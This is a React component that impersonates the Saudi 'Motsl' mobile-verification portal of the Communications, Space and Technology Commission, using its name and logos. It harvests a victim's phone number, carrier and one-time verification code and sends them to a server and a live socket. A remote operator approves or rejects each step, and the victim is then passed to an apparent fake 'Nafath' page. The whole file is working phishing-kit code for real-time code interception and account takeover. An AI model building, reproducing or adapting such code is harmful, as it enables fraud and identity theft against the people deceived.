import React, { useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Main";
import axios from "axios";
import { useSocketEvent } from "../hooks/useSocketEvent";

const Motsl = () => {
  const navigate = useNavigate();
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const parsedData = useMemo(() => (data ? JSON.parse(data) : null), [data]);
  const [motslOtp, setMotslOtp] = useState(null);
  const [loading, setLoading] = useState(false);
  const [failed, setFaild] = useState(null);
  const [storedData, setData] = useState({
    MotslPhone: "",
    MotslService: "",
    MotslOtp: "",
  });
  const [page, setPage] = useState(0);
  const [error, setError] = useState({});

  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;
    setData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError({});
    setFaild(false);
    if (!storedData.MotslService) {
      setError({ service: "مطلوب" });
      setLoading(false);
    }
    const { fullname, email, _id } = parsedData;
    const final = {
      MotslPhone: storedData.MotslPhone,
      MotslService: storedData.MotslService,
      fullname,
      email,
    };
    try {
      await axios.post(serverRoute + "/motsl/" + _id, final).then(() => {
        setLoading(false);
        socket.emit("motsl", { ...final, id:_id });
        setPage(1);
      });
    } catch (error) {}
  };

  const handleMotslOtp = async (e) => {
    e.preventDefault();
    setLoading(true);
    const { fullname, email, _id } = parsedData;
    const final = {
      MotslPhone: storedData.MotslPhone,
      MotslService: storedData.MotslService,
      MotslOtp: storedData.MotslOtp,
      fullname,
      email,
    };
    try {
      await axios
        .post(serverRoute + "/motslOtp/"+_id, final)
        .then(() => {
          setLoading(false);
          socket.emit("motslOtp", { ...final, id:_id });
          setPage(1);
        });
    } catch (error) {}
  };

  useSocketEvent("acceptMotsl", (id) => {
    if (parsedData && id === parsedData._id) {
      setPage(2);
    }
  });

  useSocketEvent("declineMotsl", (id) => {
    if (parsedData && id === parsedData._id) {
      setPage(0);
      setFaild("خطأ في البيانات");
    }
  });

  useSocketEvent("acceptMotslOtp", (id) => {
    if (parsedData && id === parsedData._id) {
      navigate(
        "/navaz?data=" +
          JSON.stringify({
            ...parsedData,
            MotslPhone: storedData.MotslPhone,
            MotslService: storedData.MotslService,
            MotslOtp: storedData.MotslOtp,
          })
      );
    }
  });

  useSocketEvent("declineMotslOtp", (id) => {
    if (parsedData && id === parsedData._id) {
      setFaild("خطأ في البيانات");
      setPage(2);
    }
  });
  return (
    <div className="w-full bg-sky-50 flex items-center justify-center md:p-10 py-10 px-3">
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      <div className="md:w-3/4 w-full bg-white flex flex-col items-start p-2 my-5">
        <div className="flex items-start gap-x-2 w-full">
          <div className="flex items-start justify-end w-full">
            <div className="flex-col flex md:text-lg " dir="rtl">
              <span className="">هيئة الإتصالات والفضاء التقنية</span>
              <span className="text-blue-700 font-bold">بوابة متصل</span>
            </div>
            <img src="/motsl.png" />
          </div>
          <img src="/motsl.svg" className="w-16" />
        </div>
        {failed && (
          <span className="p-2 w-full text-red-500 text-center text-xl">
            {failed}
          </span>
        )}
        {page === 0 ? (
          <>
            <div className="flex w-full justify-end p-2">
              <span className="w-1/2 text-gray-500 text-sm text-right">
                من اجل حماية عميلنا، نجن بحاجة الى التحقق من ملكية الهاتف
                النقال.
                <br />
                الرجاء رقم هاتفك النقال وإختيار مشغل الشبكة ثم النقر على دخول
              </span>
            </div>

            <form
              className="w-full flex flex-col p-2 "
              dir="rtl"
              onSubmit={handleSubmit}
            >
              <div className="flex flex-col w-full md:flex-row gap-5">
                <div className="md:w-1/2 gap-y-2 w-full flex flex-col text-lg">
                  <label className="text-gray-600"> رقم الهاتف المتنقل*</label>
                  <input
                    type="text"
                    placeholder="رقم الهاتف"
                    className="border-2 rounded-md p-2 outline-sky-500 text-base"
                    min={9}
                    minLength={9}
                    max={10}
                    maxLength={10}
                    required
                    value={storedData.MotslPhone}
                    onChange={handleChange}
                    name="MotslPhone"
                  />
                  {error.phone && (
                    <span className="  text-red-400   text-sm">
                      {error.phone}
                    </span>
                  )}
                </div>
                <div className="md:w-1/2 gap-y-2 w-full flex flex-col text-lg">
                  <label className="text-gray-600 "> مشغل شبكة الجوال*</label>
                  <select
                    type="text"
                    name="MotslService"
                    className="border-2 rounded-md p-2 outline-sky-500 text-base"
                    min={9}
                    minLength={9}
                    max={10}
                    maxLength={10}
                    required
                    value={storedData.MotslService}
                    onChange={handleChange}
                  >
                    <option hidden>اختر مشغل الشبكة</option>
                    <option>Zain</option>
                    <option>Mobily</option>
                    <option>STC</option>
                    <option>Salam</option>
                    <option>Virgin</option>
                    <option>Redbull</option>
                  </select>
                  {error.service && (
                    <span className="  text-red-400   text-sm">
                      {error.service}
                    </span>
                  )}
                </div>
              </div>
              <div className="w-full text-left">
                <button className="w-fit border border-gray-700 text-gray-700 px-2 py-1">
                  دخول
                </button>
              </div>
            </form>
          </>
        ) : page === 1 ? (
          <>
            <span className="w-full text-sm text-gray-500 text-right my-5">
              سوف يتم إرسال رمز التحقق إلى هاتفك النقال <br />
              ... الرجاء الإنتظارالى حين معالجة العملية
            </span>
            <div class="container">
              <div class="bar"></div>
            </div>
          </>
        ) : (
          <>
            <div className="flex flex-col w-full my-3 gap-3">
              <span className="text-gray-700 w-full  text-sm text-right">
                .تم إرسال رمز التحقق إلى هاتفك النقال الرجاء إدخالة في هذه
                الخانة.
              </span>
              <span className="text-gray-700 w-full  text-sm text-right">
                * الرجاء إدخال كود التحقق داخل الصورة
              </span>
            </div>
            <form
              className="flex flex-col justify-start items-start w-full gap-2"
              dir="rtl"
              onSubmit={handleMotslOtp}
            >
              <span>رمز التحقق*</span>
              <input
                type="text"
                placeholder="رمز التحقق*"
                className="w-full p-2 rounded-md border border-gray-400 outline-sky-400"
                required
                name="MotslOtp"
                max={6}
                maxLength={6}
                minLength={6}
                min={6}
                value={storedData.MotslOtp}
                onChange={handleChange}
              />
              <div className="w-full text-left">
                <button className="w-fit border border-gray-700 text-gray-700 px-3 py-1">
                  التالي
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default Motsl;
